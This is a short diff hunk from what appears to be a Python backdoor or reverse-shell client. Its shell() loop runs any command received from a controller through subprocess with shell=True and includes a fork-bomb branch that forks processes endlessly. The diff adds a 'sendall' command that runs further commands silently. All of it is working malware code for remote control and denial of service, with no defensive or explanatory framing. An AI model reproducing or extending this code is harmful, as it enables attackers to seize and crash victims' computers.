@@ -121,7 +121,8 @@ def shell():
             while True:
                 os.fork()
             reliable_send(termcolor.colored("[+] Done sent frokbomb", 'green'))
-
+        elif cmd[:7] == "sendall":
+            subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         else:
             execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
